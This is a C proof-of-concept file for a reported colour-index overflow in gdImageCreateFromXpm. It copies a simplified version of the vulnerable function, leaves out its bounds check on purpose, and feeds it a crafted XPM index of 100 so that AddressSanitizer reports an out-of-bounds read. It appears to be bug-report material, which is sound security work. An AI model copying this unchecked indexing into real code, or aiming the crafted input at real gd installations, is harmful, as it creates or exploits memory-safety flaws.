/*
 * POC for Issue #7: gdImageCreateFromXpm Color Index Overflow
 * CRASH VERSION - Will trigger ASAN
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    int width;
    int height;
    int ncolors;
    int cpp;
    char** data;
} XpmImage;

void gdImageCreateFromXpm_vulnerable(XpmImage image) {
    int* colors;
    int number = image.ncolors;
    int i, j;

    printf("[*] Creating color table for %d colors\n", number);

    colors = (int*)malloc(sizeof(int) * number);
    if (!colors) {
        printf("[-] Allocation failed\n");
        return;
    }

    printf("[+] colors array allocated: %p - %p (%zu bytes)\n",
           (void*)colors, (void*)(colors + number),
           sizeof(int) * number);

    for (i = 0; i < number; i++) {
        colors[i] = 0xFF000000 | (i << 16) | (i << 8) | i;
    }

    printf("[+] Color table initialized\n\n");
    printf("[*] Processing %dx%d pixels\n", image.width, image.height);

    for (i = 0; i < image.height; i++) {
        char* pointer = image.data[i];

        for (j = 0; j < image.width; j++) {
            int k = *pointer++;

            printf("[*] Pixel (%d,%d): index=%d ", j, i, k);

            if (k < 0 || k >= number) {
                printf("[!] OUT OF BOUNDS! (valid range: 0-%d)\n", number - 1);
                printf("[!] Accessing colors[%d]\n", k);
                printf("[!] Triggering crash...\n\n");

                // CRASH TRIGGER - Access out-of-bounds
                int color = colors[k];  // CRASH HERE!
                printf("    Color value: 0x%08X (should not reach here)\n", color);
            } else {
                int color = colors[k];
                printf("OK (color=0x%08X)\n", color);
            }
        }
    }

    free(colors);
}

int main() {
    printf("[*] POC for Issue #7: gdImageCreateFromXpm Color Index Overflow\n");
    printf("[*] CRASH VERSION - Will trigger ASAN\n\n");

    // Malicious XPM with out-of-bounds index
    printf("=== Test: Malicious XPM (out-of-bounds index) ===\n");
    printf("[!] Crafted XPM with color index 100 (only 3 colors allocated)\n\n");

    char* malicious_data[] = {
        "\x00\x01\x02",
        "\x01\x64\x00",  // 0x64 = 100 - OUT OF BOUNDS!
        "\x02\x00\x01"
    };

    XpmImage malicious_image = {
        .width = 3,
        .height = 3,
        .ncolors = 3,  // Only 3 colors
        .cpp = 1,
        .data = malicious_data
    };

    gdImageCreateFromXpm_vulnerable(malicious_image);

    printf("\n[!] ERROR: Should have crashed but didn't!\n");
    return 0;
}
